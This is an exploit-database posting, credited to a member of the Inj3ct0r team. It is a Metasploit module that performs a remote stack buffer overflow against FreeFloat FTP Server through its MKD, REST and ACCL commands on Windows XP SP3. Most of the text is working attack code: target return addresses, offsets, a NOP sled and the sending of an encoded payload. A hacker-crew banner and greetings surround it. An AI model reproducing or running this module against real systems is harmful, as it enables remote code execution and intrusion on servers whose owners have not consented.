1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : FreeFloat FTP Server Multiple Remote Buffer Overflow Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * sec4ever.com
# Facebook : http://facebook.com/KedAns
# platform : windows
# Impact : Remote Buffer Overflow ( in MKD/REST/ACCL command's)
# Tested on : Windows XP SP3 (Fr)
##

##
# $Id: fftp_bof.rb  2011-09-01 20:14  KedAns-Dz $
##

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::Ftp
 
  def initialize(info = {})
    super(update_info(info,
    'Name' => 'FreeFloat FTP Server Multiple Remote Buffer Overflow Exploit',
    'Description' => %q{
      This module exploits a FreeFloat FTP Server Buffer Overflow
	  found in the MKD/REST/ACCL command's.
     },
    'Author' => [
       'C4SS!0 G0M3S', # Discovery Vuln.
       'KedAns-Dz' # Metasploit Module
        ],
    'License' => MSF_LICENSE,
    'Version' => '$Revision: 0.1',
    'References' =>
      [
       [ 'URL', 'http://www.exploit-db.com/exploits/17539' ],
       [ 'URL', 'http://www.exploit-db.com/exploits/17546' ],
       [ 'URL', 'http://www.exploit-db.com/exploits/17550' ], # by mortis
      ],
    'DefaultOptions' =>
      {
       'EXITFUNC' => 'process',
        },
    'Payload' =>
      {
       'BadChars' => "\x00\x0a\x0d",
      },
    'Platform' => 'win',
    'Targets' =>
      [
        [ 'FreeFloat FTP Server (Windows XP-SP3 / REST command)',
           {
            'Ret' => 0x7C874413, # jmp esp - (KERNEL32.DLL) 
            'Offset' => 246,
            'CMD' => 'REST'
           }
        ],
		[ 'FreeFloat FTP Server (Windows XP-SP3 / MKD command)',
           {
            'Ret' => 0x7cb97475, # jmp esp - (SHELL32.DLL)
            'Offset' => 247,
            'CMD' => 'MKD'
           }
        ],
		[ 'FreeFloat FTP Server (Windows XP-SP3 / ACCL command)',
           {
            'Ret' => 0x7C874413, # jmp esp - (KERNEL32.DLL)
            'Offset' => 246,
            'CMD' => 'ACCL'
           }
        ],
                ],
        'DefaultTarget' => 1))
    end
 
    def exploit
        connect_login
 
        print_status("Trying target #{target.name}...")
 
        buf = make_nops(target['Offset']) + [target.ret].pack('V')
        buf << make_nops(20)
        buf << payload.encoded
 
        send_cmd( [target['CMD'], buf] , false )
 
        handler
        disconnect
    end
 
end

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > + Rizky Ariestiyansyah * Islam Caddy <3
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * SeeMe * XroGuE * ZoRLu * gunslinger_ 
# anT!-Tr0J4n * ^Xecuti0N3r * Kalashinkov3 (www.1337day.com/team) * Dz Offenders Cr3w * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * H-KinG * www.packetstormsecurity.org * TreX (hotturks.org)
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#=================================================================================================